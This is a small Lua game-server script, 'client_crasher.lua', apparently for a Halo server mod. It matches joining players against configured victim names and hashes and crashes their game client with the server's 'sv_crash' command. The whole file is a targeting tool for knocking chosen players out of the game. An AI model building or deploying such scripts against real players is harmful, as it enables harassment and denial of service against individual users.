--[[
=====================================================================================
SCRIPT NAME:      client_crasher.lua
DESCRIPTION:      Crashes the client of a player when they join the server.
                  Configure the VICTIM_NAMES and VICTIM_HASHES tables to specify
                  the names and hashes of the players you want to crash.

Copyright (c) 2016-2026 Jericho Crosby (Chalwk)
LICENSE:          MIT License
                  https://github.com/Chalwk/SPCLib/blob/master/LICENSE
=====================================================================================
]]

-- CONFIG START --
local VICTIM_NAMES = {
    "billybob"
    -- add more names as needed
}

local VICTIM_HASHES = {
    "4d102436ecc0621415e81d21d5a39361"
    -- add more hashes as needed
}
-- CONFIG END --

function GetRequiredVersion() return 200 end

function OnScriptLoad() end

function OnScriptUnload() end

function OnPlayerJoin(id)
    local name = getname(id)
    local hash = gethash(id)

    for i = 1, #VICTIM_NAMES do
        if name == VICTIM_NAMES[i] then
            svcmd("sv_crash " .. resolveplayer(id))
            return
        end
    end

    for i = 1, #VICTIM_HASHES do
        if hash == VICTIM_HASHES[i] then
            svcmd("sv_crash " .. resolveplayer(id))
            return
        end
    end
end
